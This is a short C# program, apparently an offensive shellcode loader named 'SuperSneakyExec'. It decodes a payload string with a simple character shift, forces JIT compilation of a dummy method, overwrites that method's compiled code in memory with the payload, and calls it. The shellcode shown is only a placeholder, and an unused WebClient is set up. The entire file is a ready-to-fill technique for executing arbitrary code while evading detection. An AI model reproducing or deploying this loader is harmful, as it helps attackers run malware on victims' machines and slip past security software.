using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace SuperSneakyExec
{
    class Program
    {

        static void Main(string[] args)
        {

            WebClient wc = new WebClient();
			string shellcode = "41414141";
            byte[] buf = stringToByteArray(shellcode);
            IntPtr ptrToMethod = IntPtr.Zero;
            MethodInfo myMethod = null;
            myMethod = typeof(Program).GetMethod("overWriteReflection");
            System.Runtime.CompilerServices.RuntimeHelpers.PrepareMethod(myMethod.MethodHandle);
            ptrToMethod = myMethod.MethodHandle.GetFunctionPointer();
            Marshal.Copy(buf, 0, ptrToMethod, buf.Length);
            overWriteReflection();
        }

        public static void overWriteReflection()
        {
            bool malCode = false;
            if (malCode is true)
                return;
            return;
        }

        public static byte[] stringToByteArray(string shellcode)
        {
            byte[] sc = new byte[shellcode.Length];
            for (int i = 0; i < shellcode.Length; i++)
            {
                sc[i] = Convert.ToByte(shellcode[i]-1);
            }
            return sc;
        }
    }
}